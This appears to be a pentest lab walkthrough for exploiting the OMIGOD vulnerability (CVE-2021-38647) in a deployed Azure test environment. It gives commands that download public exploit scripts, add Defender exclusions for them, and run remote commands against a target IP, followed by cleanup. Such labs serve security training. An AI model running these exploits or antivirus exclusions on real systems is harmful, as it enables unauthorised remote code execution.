
### Prepare the environment
```
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/davidokeyode/azure-cloudsec-practitioner/main/OMIGOD/OmiGodDeploy.ps1" -OutFile "OmiGodDeploy.ps1"

Unblock-File .\OmiGodDeploy.ps1

.\OmiGodDeploy.ps1
```


### Download and execute exploit for CVE-2021-38647 (PowerShell)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/main/Invoke-CVE-2021-38647.ps1" -OutFile "Invoke-CVE-2021-38647.ps1"

Unblock-File .\Invoke-CVE-2021-38647.ps1

Add-MpPreference -ExclusionPath "$env:SystemDrive\PentestTools\Azure\Attack\Invoke-CVE-2021-38647.ps1"

Invoke-CVE-2021-38647 -TargetIP <IP address> -TargetPort 5986 -Command whoami

```

### Download and execute exploit for CVE-2021-38647 (Python - Option 1)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlteredSecurity/CVE-2021-38647/main/CVE-2021-38647.py" -OutFile "CVE-2021-38647.py"

Unblock-File .\CVE-2021-38647.py

Add-MpPreference -ExclusionPath "$env:SystemDrive\PentestTools\Azure\Attack\CVE-2021-38647.py"

python .\CVE-2021-38647.py -t <IP address> -p 5986 -c id
```


### Download and execute exploit for CVE-2021-38647 (Python - Option 2)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/main/omigod.py" -OutFile "omigod.py"

Unblock-File .\omigod.py

Add-MpPreference -ExclusionPath "$env:SystemDrive\PentestTools\Azure\Attack\omigod.py"

python3.12.exe .\omigod.py -t <IP address> -c id

python3 omigod.py -t <IP address> -c id
```

### Cleanup
```
$group = "OMIGOD-RG"
az group delete --name $group --yes --no-wait
```

